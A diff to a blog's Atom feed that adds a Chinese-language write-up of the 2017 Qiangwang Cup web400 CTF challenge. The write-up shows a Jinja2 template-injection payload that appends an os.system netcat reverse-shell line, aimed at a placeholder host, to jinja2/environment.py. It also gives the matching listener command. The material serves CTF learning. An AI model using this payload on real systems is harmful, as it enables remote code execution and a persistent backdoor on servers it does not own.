@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-05-15T02:50:04.702Z</updated>
+  <updated>2017-09-11T08:08:32.797Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,53 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>18.2017强网杯web400题Writeup</title>
+    <link href="http://yoursite.com/2017%E5%BC%BA%E7%BD%91%E6%9D%AFweb400%E9%A2%98Writeup/"/>
+    <id>http://yoursite.com/2017强网杯web400题Writeup/</id>
+    <published>2017-09-11T07:48:35.000Z</published>
+    <updated>2017-09-11T08:08:32.797Z</updated>
+    
+    <content type="html">&lt;p&gt;　　2017强网杯web题web400的Writeup，详细分析利用过程。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;Jinja模板注入漏洞验证&quot;&gt;&lt;a href=&quot;#Jinja模板注入漏洞验证&quot; class=&quot;headerlink&quot; title=&quot;Jinja模板注入漏洞验证&quot;&gt;&lt;/a&gt;Jinja模板注入漏洞验证&lt;/h2&gt;&lt;p&gt;　　注册一个账号2，然后利用donate功能，填入一个正常可访问的url地址，用户名是我们刚注册的用户名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/18/18-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　触发报错，如图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/18/18-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　变量text的值就是我们构造的用户名，在jinja模板中执行的结果，执行代码看下图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/18/18-3.png&quot; alt=&quot;Angoddess&quot;&gt; &lt;/p&gt;
+&lt;p&gt;　　以上证实存在模板注入，&lt;code&gt;\{\{\}\}&lt;/code&gt;里面的内容会被执行&lt;/p&gt;
+&lt;h2 id=&quot;利用模板注入获取反弹shell&quot;&gt;&lt;a href=&quot;#利用模板注入获取反弹shell&quot; class=&quot;headerlink&quot; title=&quot;利用模板注入获取反弹shell&quot;&gt;&lt;/a&gt;利用模板注入获取反弹shell&lt;/h2&gt;&lt;p&gt;　　首先我们利用jinja模板语言，调用python的内置方法，来获取当前的所有可引用的方法列表&lt;/p&gt;
+&lt;p&gt;　　注册一个用户名为&lt;code&gt;\{\{&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()\}\}&lt;/code&gt;的账号&lt;br&gt;　　&lt;br&gt;　　同样触发漏洞，我们可以看到当前可调用的一些引用方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/18/18-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　我们利用file方法来进行操作，file的索引是40（按顺序算），我们构造我们的payload，利用它来进行反弹shell，从而达到命令执行&lt;/p&gt;
+&lt;p&gt;　　&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;　　Payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;#123;&amp;apos;&amp;apos;.__class__.__mro__[2].__subclasses__()[40](&amp;apos;2f7573722f6c6f63616c2f6c69622f707974686f6e322e372f646973742d7061636b616765732f6a696e6a61322f656e7669726f6e6d656e742e7079&amp;apos;.decode(&amp;apos;hex&amp;apos;),&amp;apos;a&amp;apos;).write(&amp;quot;\nos.system(&amp;apos;nc xx.xx.xx.xx 5|sh|nc xx.xx.xx.xx 6&amp;apos;)&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;　　加密的hex密文内容是&lt;/p&gt;
+&lt;p&gt;　　&lt;code&gt;/usr/local/lib/python2.7/dist-packages/jinja2/environment.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;　　这是jinja的模板环境文件，该文件中引用了os模块，所以我们通过写入调用系统命令来执行nc反弹shell，酱紫只要web应用每次使用jinja模板都会触发该shell命令。&lt;/p&gt;
+&lt;p&gt;　　那么现在我们先注册用户名为payload内容的用户，xx.xx.xx.xx替换为接收反弹shell的服务器地址&lt;/p&gt;
+&lt;p&gt;　　然后在我们接收shell的服务器上启动监听&lt;/p&gt;
+&lt;p&gt;　　&lt;code&gt;nc -vv -l -p 5|nc -vv -l -p 6&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;　　最后利用donate功能，这回触不触发报错都没关系了，只要是正确可访问的网址就行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/uploads/18/18-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
+&lt;p&gt;　　直接当前目录看到flag文件，成功获取flag&lt;/p&gt;
+&lt;p&gt;　　PS：我上面使用的nc的一种方式来反弹shell，由于用户名长度有限制，所以太常的payload是注册不了用户名的，那么就还有一种方法，就是远程获取反弹shell的文件，读取内容写入该文件，或者下载下来，额外执行，这里就多说了！&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;　　2017强网杯web题web400的Writeup，详细分析利用过程。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="others" scheme="http://yoursite.com/categories/others/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+  </entry>
   
   <entry>
     <title>17.2017年5月12日国内高校比特币勒索事件与防范应对措施</title>
